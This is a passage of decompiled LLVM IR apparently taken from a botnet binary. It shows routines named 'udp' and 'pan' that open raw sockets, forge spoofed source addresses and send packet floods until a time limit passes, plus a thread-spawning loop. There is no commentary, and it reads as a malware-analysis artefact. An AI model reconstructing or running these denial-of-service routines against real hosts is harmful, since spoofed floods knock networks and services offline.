  %v1_10007b84 = add i32 %v3_10007b74, 23
  %v1_10007b88 = and i32 %v1_10007b84, -16
  store i32 %v1_100078c8, i32* %r9.global-to-local, align 4
  %v2_10007c582 = icmp sgt i32 %v1_100078c8, 0
  br i1 %v2_10007c582, label %dec_label_pc_10007ba8, label %dec_label_pc_10007c60

dec_label_pc_10007ba8:                            ; preds = %dec_label_pc_10007ad8, %dec_label_pc_10007ba8
  %storemerge15 = phi i32 [ %v1_10007c48, %dec_label_pc_10007ba8 ], [ 0, %dec_label_pc_10007ad8 ]
  %v1_10007bb0 = mul i32 %storemerge15, 24
  %v2_10007bb4 = add i32 %v1_10007bb0, %v1_10007b88
  %v2_10007bbc = inttoptr i32 %v2_10007bb4 to i32*
  store i32 %storemerge15, i32* %v2_10007bbc, align 8
  store i32 %v2_10007bb4, i32* %r9.global-to-local, align 4
  store i32 %v1_10007b48, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10007be0 = add i32 %v2_10007bb4, 8
  %v3_10007be0 = inttoptr i32 %v2_10007be0 to i32*
  store i32 2, i32* %v3_10007be0, align 8
  %v0_10007be4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007be4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007be4 = add i32 %v1_10007be4, 12
  %v3_10007be4 = inttoptr i32 %v2_10007be4 to i32*
  store i32 %v0_10007be4, i32* %v3_10007be4, align 4
  %v0_10007be8 = load i32, i32* @r10, align 4
  %v1_10007be8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007be8 = add i32 %v1_10007be8, 16
  %v3_10007be8 = inttoptr i32 %v2_10007be8 to i32*
  store i32 %v0_10007be8, i32* %v3_10007be8, align 4
  %v1_10007bec = load i32, i32* %r9.global-to-local, align 4
  %v2_10007bec = add i32 %v1_10007bec, 20
  %v3_10007bec = inttoptr i32 %v2_10007bec to i32*
  store i32 %tmp7, i32* %v3_10007bec, align 4
  %v1_10007c00 = or i32 %v2_10007bb4, 4
  %v2_10007c08 = inttoptr i32 %v1_10007c00 to i32*
  store i32 %v3_10007ae0, i32* %v2_10007c08, align 4
  %v1_10007c14 = mul i32 %storemerge15, 4
  %v2_10007c18 = add i32 %v1_10007c14, %v1_10007b1c
  store i32 %v2_10007c18, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268467268, i32* @lr, align 4
  %v6_10007c40 = inttoptr i32 %v2_10007c18 to i32*
  %v7_10007c40 = call i32 @pthread_create(i32* %v6_10007c40, i32 0, i32 268465188, i32 %v2_10007bb4, i32 %tmp7, i32 268435456)
  %v1_10007c48 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_100078c8, i32* %r9.global-to-local, align 4
  %v2_10007c58 = icmp slt i32 %v1_10007c48, %v1_100078c8
  br i1 %v2_10007c58, label %dec_label_pc_10007ba8, label %dec_label_pc_10007c60

dec_label_pc_10007c60:                            ; preds = %dec_label_pc_10007ba8, %dec_label_pc_10007ad8
  store i32 %v1_10007b3c, i32* %r9.global-to-local, align 4
  %v2_10007c68 = load i32, i32* %v1_10007b40, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10007c84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002afc4.329 to i32), i32 %arg2, i32 %v2_10007c68)
  store i32 %v1_100077a0, i32* %r9.global-to-local, align 4
  %v2_10007c98 = load i32, i32* %v1_100077a4, align 4
  store i32 268467364, i32* @lr, align 4
  %v1_10007ca0 = call i32 @atol(i32 %v2_10007c98)
  %v2_10007cac = mul i32 %v1_10007ca0, 20
  store i32 %v2_10007cac, i32* %r9.global-to-local, align 4
  %v3_10007cb4 = icmp sgt i32 %v2_10007cac, 0
  br i1 %v3_10007cb4, label %dec_label_pc_10007cbc, label %dec_label_pc_10007dd4

dec_label_pc_10007cbc:                            ; preds = %dec_label_pc_10007c60
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268467412, i32* @lr, align 4
  %v1_10007cd0 = call i32 @usleep(i32 50000)
  %v3_10007cd8 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10007ce0 = mul i32 %v3_10007cd8, 20
  %v3_10007ce8 = icmp ugt i32 %v2_10007ce0, %v1_100078e4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10007cf4 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_10007ce8, label %dec_label_pc_10007cf0, label %dec_label_pc_10007d30

dec_label_pc_10007cf0:                            ; preds = %dec_label_pc_10007cbc
  %v2_10007cf8 = icmp sgt i32 %v3_10007cf4, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10007cf8, label %dec_label_pc_10007d18, label %dec_label_pc_10007d00

dec_label_pc_10007d00:                            ; preds = %dec_label_pc_10007cf0
  %v3_10007d04 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10007d08 = add i32 %v3_10007d04, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d08, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10007d78

dec_label_pc_10007d18:                            ; preds = %dec_label_pc_10007cf0
  %v1_10007d20 = add i32 %v3_10007cf4, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d20, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_10007d78

dec_label_pc_10007d30:                            ; preds = %dec_label_pc_10007cbc
  %v1_10007d38 = add i32 %v3_10007cf4, 1
  store i32 %v1_10007d38, i32* @global_var_10045174.120, align 4
  %v3_10007d48 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp41 = icmp ult i32 %v3_10007d48, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_10007d6c, label %dec_label_pc_10007d54

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d30
  %v1_10007d5c = add i32 %v3_10007d48, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d5c, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10007d78

dec_label_pc_10007d6c:                            ; preds = %dec_label_pc_10007d30
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10007d78

dec_label_pc_10007d78:                            ; preds = %dec_label_pc_10007d54, %dec_label_pc_10007d18, %dec_label_pc_10007d00, %dec_label_pc_10007d6c
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v2_10007da8 = add i32 %v2_100077a4, %v1_10007790
  br label %dec_label_pc_10007d84

dec_label_pc_10007d84:                            ; preds = %dec_label_pc_10007dc4, %dec_label_pc_10007d78
  %stack_var_-1116.0 = phi i32 [ %tmp, %dec_label_pc_10007d78 ], [ %v1_10007dc8, %dec_label_pc_10007dc4 ]
  %tmp42 = icmp slt i32 %stack_var_-1116.0, 100
  br i1 %tmp42, label %dec_label_pc_10007dc4, label %dec_label_pc_10007d90

dec_label_pc_10007d90:                            ; preds = %dec_label_pc_10007d84
  store i32 268467608, i32* @lr, align 4
  %v1_10007d94 = call i32 @__GI_time(i32 0)
  store i32 %v1_10007d94, i32* %r11.global-to-local, align 4
  store i32 %v1_10007790, i32* %r9.global-to-local, align 4
  %v2_10007dac = icmp ult i32 %v1_10007d94, %v2_10007da8
  br i1 %v2_10007dac, label %dec_label_pc_10007dbc, label %dec_label_pc_10007db4

dec_label_pc_10007db4:                            ; preds = %dec_label_pc_10007d90
  %v0_10007db8 = call i32 @__GI_exit()
  br label %dec_label_pc_10007dbc

dec_label_pc_10007dbc:                            ; preds = %dec_label_pc_10007d90, %dec_label_pc_10007db4
  br label %dec_label_pc_10007dc4

dec_label_pc_10007dc4:                            ; preds = %dec_label_pc_10007d84, %dec_label_pc_10007dbc
  %stack_var_-1116.1 = phi i32 [ %stack_var_-1116.0, %dec_label_pc_10007d84 ], [ 0, %dec_label_pc_10007dbc ]
  store i32 %stack_var_-1116.1, i32* %r9.global-to-local, align 4
  %v1_10007dc8 = add i32 %stack_var_-1116.1, 1
  br label %dec_label_pc_10007d84

dec_label_pc_10007dd4:                            ; preds = %dec_label_pc_10007c60
  %v0_10007dd8 = call i32 @__GI_exit()
  br label %dec_label_pc_10007ddc

dec_label_pc_10007ddc:                            ; preds = %entry, %dec_label_pc_1000778c, %dec_label_pc_10007dd4
  %v0_10007e08 = phi i32 [ %v1_10007724, %entry ], [ %v0_100077bc, %dec_label_pc_1000778c ], [ %v0_10007dd8, %dec_label_pc_10007dd4 ]
  %v2_10007ddc = load i32, i32* %stack_var_-1168, align 4
  store i32 %v5_100076ec, i32* %r9.global-to-local, align 4
  store i32 %v2_10007ddc, i32* %r11.global-to-local, align 4
  ret i32 %v0_10007e08

; uselistorder directives
  uselistorder i32 %stack_var_-1116.1, { 1, 0 }
  uselistorder i32 %v3_10007cf4, { 1, 0, 2 }
  uselistorder i32 %v1_10007c48, { 1, 0 }
  uselistorder i32 %v2_10007bb4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-1128.0.ph, { 1, 0 }
  uselistorder i32 %v3_10007a2c, { 1, 0, 2 }
  uselistorder i32 %v3_10007a18, { 1, 0 }
  uselistorder i32 %v1_100078c8, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v0_100078ac, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_1000781c, { 1, 0, 2 }
  uselistorder i32 %v2_1000780c, { 1, 0 }
  uselistorder i32 %v1_100077c8, { 2, 1, 0, 3 }
  uselistorder i32* %v1_100077b4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_100077b0, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32 %v1_10007790, { 1, 0 }
  uselistorder i32* %stack_var_-1168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32)* @usleep, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 540, { 0, 6, 7, 1, 8, 9, 2, 10, 3, 11, 12, 4, 13, 14, 5, 15, 16 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007ddc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10007dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10007d78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10007ab0, { 1, 0 }
  uselistorder label %dec_label_pc_1000778c, { 1, 0 }
  uselistorder label %dec_label_pc_10007760, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268467776, i32* @lr, align 4
  %v1_10007e3c = call i32 @__GI_time(i32 0)
  %v1_10007e4c = call i32 @mfork(i32 %arg2)
  %v3_10007e54 = icmp eq i32 %v1_10007e4c, 0
  br i1 %v3_10007e54, label %dec_label_pc_10007e5c, label %dec_label_pc_10008134

dec_label_pc_10007e5c:                            ; preds = %entry
  store i32 268467820, i32* @lr, align 4
  %v3_10007e68 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10007e68, -1
  br i1 %tmp32, label %dec_label_pc_10007e88, label %dec_label_pc_10007e80

dec_label_pc_10007e80:                            ; preds = %dec_label_pc_10007e5c
  %v0_10007e84 = call i32 @__GI_exit()
  br label %dec_label_pc_10007e88

dec_label_pc_10007e88:                            ; preds = %dec_label_pc_10007e5c, %dec_label_pc_10007e80
  %v2_10007e8c = icmp sgt i32 %arg3, 2
  br i1 %v2_10007e8c, label %dec_label_pc_10007eb4, label %dec_label_pc_10007e94

dec_label_pc_10007e94:                            ; preds = %dec_label_pc_10007e88
  %v6_10007ea8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002afe4.332 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10007eb0 = call i32 @__GI_exit()
  br label %dec_label_pc_10007eb4

dec_label_pc_10007eb4:                            ; preds = %dec_label_pc_10007e88, %dec_label_pc_10007e94
  %v1_10007eb8 = add i32 %arg4, 4
  %v1_10007ebc = inttoptr i32 %v1_10007eb8 to i32*
  %v2_10007ebc = load i32, i32* %v1_10007ebc, align 4
  store i32 268467916, i32* @lr, align 4
  %v3_10007ec8 = call i32 @host2ip(i32 %arg2, i32 %v2_10007ebc, i32 %v1_10007eb8)
  %v1_10007ed8 = add i32 %arg4, 8
  %v1_10007edc = inttoptr i32 %v1_10007ed8 to i32*
  %v2_10007edc = load i32, i32* %v1_10007edc, align 4
  store i32 268467944, i32* @lr, align 4
  %v1_10007ee4 = call i32 @atol(i32 %v2_10007edc)
  %v1_10007ef4 = add i32 %arg4, 12
  %v1_10007ef8 = inttoptr i32 %v1_10007ef4 to i32*
  %v2_10007ef8 = load i32, i32* %v1_10007ef8, align 4
  store i32 268467972, i32* @lr, align 4
  %v1_10007f00 = call i32 @atol(i32 %v2_10007ef8)
  %v2_10007f0c = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10007f18 = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10007f24 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 %v2_10007f24, i32* @r3, align 4
  store i32 10, i32* @r4, align 4
  store i32 1472, i32* @r5, align 4
  store i32 268468028, i32* @lr, align 4
  %v0_10007f38 = call i32 @__GI_memset()
  %v2_10007f44 = load i32, i32* %v1_10007ebc, align 4
  %v6_10007f60 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_1002b00c.334 to i32), i32 %arg2, i32 %v2_10007f44)
  %v1_10007f70 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007f70, i32* %stack_var_-1536, align 4
  %v1_10007f84 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10007f84, i32* %stack_var_-1536, align 4
  %v3_10007f94 = or i32 %v2_10007f0c, 1
  %v4_10007f94 = inttoptr i32 %v3_10007f94 to i8*
  store i8 0, i8* %v4_10007f94, align 1
  %v3_10007fa0 = or i32 %v2_10007f0c, 2
  %v4_10007fa0 = inttoptr i32 %v3_10007fa0 to i16*
  store i16 1500, i16* %v4_10007fa0, align 2
  %v3_10007fac = add i32 %v2_10007f0c, 6
  %v4_10007fac = inttoptr i32 %v3_10007fac to i16*
  store i16 0, i16* %v4_10007fac, align 2
  %v3_10007fb8 = add i32 %v2_10007f0c, 9
  %v4_10007fb8 = inttoptr i32 %v3_10007fb8 to i8*
  store i8 17, i8* %v4_10007fb8, align 1
  %v3_10007fc4 = add i32 %v2_10007f0c, 8
  %v4_10007fc4 = inttoptr i32 %v3_10007fc4 to i8*
  store i8 64, i8* %v4_10007fc4, align 4
  %v2_10007fd0 = add i32 %v2_10007f0c, 16
  %v3_10007fd0 = inttoptr i32 %v2_10007fd0 to i32*
  store i32 %v3_10007ec8, i32* %v3_10007fd0, align 4
  %v1_10007fd8 = urem i32 %tmp10, 65536
  store i32 %v1_10007fd8, i32* @r3, align 4
  %v1_10007fe0 = call i32 @htons(i32 %v1_10007fd8)
  %v1_10007fec = trunc i32 %v1_10007fe0 to i16
  %v3_10007fec = add i32 %v2_10007f18, 4
  %v4_10007fec = inttoptr i32 %v3_10007fec to i16*
  store i16 %v1_10007fec, i16* %v4_10007fec, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10008018 = icmp eq i32 %v1_10007ee4, 0
  %v3_10008050 = or i32 %v2_10007f18, 2
  %v4_10008050 = inttoptr i32 %v3_10008050 to i16*
  %v2_10008060 = bitcast i32* %stack_var_-1536 to i16*
  %v3_1000806c = add i32 %v2_10007f18, 6
  %v4_1000806c = inttoptr i32 %v3_1000806c to i16*
  %v2_1000807c = add i32 %v2_10007f0c, 12
  %v3_1000807c = inttoptr i32 %v2_1000807c to i32*
  %v3_10008090 = add i32 %v2_10007f0c, 4
  %v4_10008090 = inttoptr i32 %v3_10008090 to i16*
  %v3_100080ac = add i32 %v2_10007f0c, 10
  %v4_100080ac = inttoptr i32 %v3_100080ac to i16*
  %v2_100080c0 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_10008108 = add i32 %v1_10007f00, %v1_10007e3c
  %v1_10008024 = urem i32 %v1_10007ee4, 65536
  br label %dec_label_pc_10008000

dec_label_pc_10008000:                            ; preds = %dec_label_pc_10008124, %dec_label_pc_10007eb4
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10007eb4 ], [ %v1_10008128, %dec_label_pc_10008124 ]
  store i32 268468228, i32* @lr, align 4
  %v0_10008000 = call i32 @random()
  %v1_10008010 = trunc i32 %v0_10008000 to i16
  store i16 %v1_10008010, i16* %tmp33, align 4
  br i1 %v3_10008018, label %dec_label_pc_10008040, label %dec_label_pc_10008020

dec_label_pc_10008020:                            ; preds = %dec_label_pc_10008000
  store i32 %v1_10008024, i32* @r3, align 4
  %v1_1000802c = call i32 @htons(i32 %v1_10008024)
  %extract.t = trunc i32 %v1_1000802c to i16
  br label %dec_label_pc_10008054

dec_label_pc_10008040:                            ; preds = %dec_label_pc_10008000
  store i32 268468292, i32* @lr, align 4
  %v0_10008040 = call i32 @random()
  %extract.t41 = trunc i32 %v0_10008040 to i16
  br label %dec_label_pc_10008054

dec_label_pc_10008054:                            ; preds = %dec_label_pc_10008020, %dec_label_pc_10008040
  %v1_10008030.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10008020 ], [ %extract.t41, %dec_label_pc_10008040 ]
  store i16 %v1_10008030.sink.off0, i16* %v4_10008050, align 2
  %v3_10008060 = call i32 @in_cksum(i16* %v2_10008060, i32 1500)
  %sext3 = mul i32 %v3_10008060, 65536
  %v1_10008064 = sdiv i32 %sext3, 65536
  %v1_1000806c = trunc i32 %v1_10008064 to i16
  store i16 %v1_1000806c, i16* %v4_1000806c, align 2
  %v0_10008070 = call i32 @getspoof()
  store i32 %v0_10008070, i32* %v3_1000807c, align 4
  store i32 268468356, i32* @lr, align 4
  %v0_10008080 = call i32 @random()
  %v1_10008090 = trunc i32 %v0_10008080 to i16
  store i16 %v1_10008090, i16* %v4_10008090, align 4
  %v3_100080a0 = call i32 @in_cksum(i16* %v2_10008060, i32 1500)
  %v1_100080ac = trunc i32 %v3_100080a0 to i16
  store i16 %v1_100080ac, i16* %v4_100080ac, align 2
  store i32 268468452, i32* @lr, align 4
  %v6_100080e0 = call i32 @sendto(i32 %v3_10007e68, i32 %v2_10007f0c, i32 1500, i32 0, i32 %v2_100080c0, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 100
  br i1 %tmp34, label %dec_label_pc_10008124, label %dec_label_pc_100080f0

dec_label_pc_100080f0:                            ; preds = %dec_label_pc_10008054
  store i32 268468472, i32* @lr, align 4
  %v1_100080f4 = call i32 @__GI_time(i32 0)
  %v2_1000810c = icmp ult i32 %v1_100080f4, %v2_10008108
  br i1 %v2_1000810c, label %dec_label_pc_1000811c, label %dec_label_pc_10008114

dec_label_pc_10008114:                            ; preds = %dec_label_pc_100080f0
  %v0_10008118 = call i32 @__GI_exit()
  br label %dec_label_pc_1000811c

dec_label_pc_1000811c:                            ; preds = %dec_label_pc_100080f0, %dec_label_pc_10008114
  br label %dec_label_pc_10008124

dec_label_pc_10008124:                            ; preds = %dec_label_pc_10008054, %dec_label_pc_1000811c
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10008054 ], [ 0, %dec_label_pc_1000811c ]
  %v1_10008128 = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10008000

dec_label_pc_10008134:                            ; preds = %entry
  ret i32 %v1_10007e4c

; uselistorder directives
  uselistorder i32 %v1_10008024, { 1, 0 }
  uselistorder i32 %v1_10007fd8, { 1, 0 }
  uselistorder i32 %v2_10007f0c, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008124, { 1, 0 }
  uselistorder label %dec_label_pc_1000811c, { 1, 0 }
  uselistorder label %dec_label_pc_10008054, { 1, 0 }
  uselistorder label %dec_label_pc_10007eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10007e88, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v2_1000817c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_1000817c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b028.336 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10008194.337 to i32), i32* @lr, align 4
  %v0_10008190 = call i32 @memcpy()
  store i32 268468652, i32* @lr, align 4
  %v1_100081a8 = call i32 @__GI_time(i32 0)
  %v1_100081b8 = call i32 @mfork(i32 %arg2)
  %v3_100081c0 = icmp eq i32 %v1_100081b8, 0
  br i1 %v3_100081c0, label %dec_label_pc_100081c8, label %dec_label_pc_1000861c

dec_label_pc_100081c8:                            ; preds = %entry
  store i32 268468696, i32* @lr, align 4
  %v3_100081d4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100081d4, -1
  br i1 %tmp71, label %dec_label_pc_100081f4, label %dec_label_pc_100081ec

dec_label_pc_100081ec:                            ; preds = %dec_label_pc_100081c8
  %v0_100081f0 = call i32 @__GI_exit()
  br label %dec_label_pc_100081f4

dec_label_pc_100081f4:                            ; preds = %dec_label_pc_100081c8, %dec_label_pc_100081ec
  %v2_100081f8 = icmp sgt i32 %arg3, 2
  br i1 %v2_100081f8, label %dec_label_pc_10008264.preheader, label %dec_label_pc_10008200

dec_label_pc_10008200:                            ; preds = %dec_label_pc_100081f4
  %v6_10008214 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002b078.338 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000821c = call i32 @__GI_exit()
  br label %dec_label_pc_10008264.preheader

dec_label_pc_10008264.preheader:                  ; preds = %dec_label_pc_100081f4, %dec_label_pc_10008200
  store i32 0, i32* %stack_var_-296, align 4
  %v2_10008238 = ptrtoint i32* %stack_var_-296 to i32
  %v2_1000823c = add i32 %v2_10008238, 168
  %v2_10008250 = add i32 %v2_10008238, 80
  br label %dec_label_pc_1000822c

dec_label_pc_1000822c:                            ; preds = %dec_label_pc_10008264.preheader, %dec_label_pc_1000822c
  %v3_1000822c = phi i32 [ 0, %dec_label_pc_10008264.preheader ], [ %v1_1000825c, %dec_label_pc_1000822c ]
  %v1_10008234 = mul i32 %v3_1000822c, 4
  %v1_10008240 = add i32 %v2_1000823c, %v1_10008234
  %v1_10008244 = inttoptr i32 %v1_10008240 to i32*
  %v2_10008244 = load i32, i32* %v1_10008244, align 4
  %v1_10008254 = trunc i32 %v2_10008244 to i8
  %v3_10008254 = add i32 %v2_10008250, %v3_1000822c
  %v4_10008254 = inttoptr i32 %v3_10008254 to i8*
  store i8 %v1_10008254, i8* %v4_10008254, align 1
  %v3_10008258 = load i32, i32* %stack_var_-296, align 4
  %v1_1000825c = add i32 %v3_10008258, 1
  store i32 %v1_1000825c, i32* %stack_var_-296, align 4
  %tmp72 = icmp slt i32 %v1_1000825c, 20
  br i1 %tmp72, label %dec_label_pc_1000822c, label %dec_label_pc_10008270

dec_label_pc_10008270:                            ; preds = %dec_label_pc_1000822c
  %v1_10008274 = add i32 %arg4, 4
  %v1_10008278 = inttoptr i32 %v1_10008274 to i32*
  %v2_10008278 = load i32, i32* %v1_10008278, align 4
  store i32 268468872, i32* @lr, align 4
  %v3_10008284 = call i32 @host2ip(i32 %arg2, i32 %v2_10008278, i32 %v1_10008274)
  %v1_10008294 = add i32 %arg4, 12
  %v1_10008298 = inttoptr i32 %v1_10008294 to i32*
  %v2_10008298 = load i32, i32* %v1_10008298, align 4
  store i32 268468900, i32* @lr, align 4
  %v1_100082a0 = call i32 @atol(i32 %v2_10008298)
  %v2_100082b4 = load i32, i32* %v1_10008278, align 4
  %v6_100082d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_1002b0a0.341 to i32), i32 %arg2, i32 %v2_100082b4)
  %v1_100082dc = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_100082ec = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100082ec, i32* %stack_var_-256, align 4
  %v1_10008324 = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  %v1_10008334 = call i32 @__asm_rlwimi(i32 0, i32 24, i32 4, i32 7)
  %v1_10008340 = call i32 @__asm_rlwinm(i32 %v1_10008334, i32 0, i32 11, i32 9)
  %v1_1000834c = call i32 @__asm_rlwinm(i32 %v1_10008340, i32 0, i32 12, i32 10)
  %v1_10008358 = call i32 @__asm_rlwinm(i32 %v1_1000834c, i32 0, i32 13, i32 11)
  %v1_10008364 = call i32 @__asm_rlwinm(i32 %v1_10008358, i32 0, i32 14, i32 12)
  %v1_10008370 = call i32 @__asm_rlwinm(i32 %v1_10008364, i32 0, i32 16, i32 14)
  %v1_10008398 = add i32 %arg4, 8
  %v1_1000839c = inttoptr i32 %v1_10008398 to i32*
  %v2_1000839c = load i32, i32* %v1_1000839c, align 4
  store i32 268469160, i32* @lr, align 4
  %v1_100083a4 = call i32 @atol(i32 %v2_1000839c)
  %v1_100083ac = urem i32 %v1_100083a4, 65536
  store i32 %v1_100083ac, i32* @r3, align 4
  %v1_100083b4 = call i32 @htons(i32 %v1_100083ac)
  store i32 268469192, i32* @lr, align 4
  %v1_100083c4 = call i32 @__GI_time(i32 0)
  store i32 268469200, i32* @lr, align 4
  %v0_100083cc = call i32 @__libc_getpid()
  %v2_100083d4 = add i32 %v1_100083c4, %v0_100083cc
  store i32 268469216, i32* @lr, align 4
  %v1_100083dc = call i32 @srand(i32 %v2_100083d4)
  %v2_10008490 = ptrtoint i32* %stack_var_-256 to i32
  %v2_1000849c = bitcast i32* %stack_var_-256 to i16*
  %v2_10008544 = ptrtoint i32* %stack_var_-236 to i32
  %v2_10008548 = ptrtoint i32* %stack_var_-196 to i32
  %v2_1000854c = ptrtoint i32* %stack_var_-184 to i32
  %v2_10008564 = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000856c = ptrtoint i32* %stack_var_-164 to i32
  %v2_10008594 = bitcast i32* %stack_var_-196 to i16*
  %v2_100085a8 = ptrtoint i32* %stack_var_-144 to i32
  %v2_100085f0 = add i32 %v1_100082a0, %v1_100081a8
  br label %dec_label_pc_100083e0

dec_label_pc_100083e0:                            ; preds = %dec_label_pc_1000860c, %dec_label_pc_10008270
  %stack_var_-260.0 = phi i32 [ 0, %dec_label_pc_10008270 ], [ %v1_10008610, %dec_label_pc_1000860c ]
  %v2_100083e8 = load i32, i32* %v1_1000839c, align 4
  store i32 268469236, i32* @lr, align 4
  %v1_100083f0 = call i32 @atol(i32 %v2_100083e8)
  %v3_100083f8 = icmp eq i32 %v1_100083f0, 0
  br i1 %v3_100083f8, label %dec_label_pc_10008400, label %dec_label_pc_1000840c

dec_label_pc_10008400:                            ; preds = %dec_label_pc_100083e0
  store i32 268469252, i32* @lr, align 4
  %v0_10008400 = call i32 @random()
  br label %dec_label_pc_1000840c

dec_label_pc_1000840c:                            ; preds = %dec_label_pc_100083e0, %dec_label_pc_10008400
  %v0_1000840c = call i32 @getspoof()
  store i32 60, i32* @r3, align 4
  %v1_1000842c = call i32 @htons(i32 60)
  store i32 268469308, i32* @lr, align 4
  %v0_10008438 = call i32 @random()
  %v1_1000845c = urem i32 %v0_1000840c, 65536
  store i32 %v1_1000845c, i32* %stack_var_-236, align 4
  store i32 268469364, i32* @lr, align 4
  %v0_10008470 = call i32 @random()
  %v3_1000849c = call i32 @in_cksum(i16* %v2_1000849c, i32 20)
  store i32 268469420, i32* @lr, align 4
  %v0_100084a8 = call i32 @random()
  store i32 %v0_1000840c, i32* %stack_var_-196, align 4
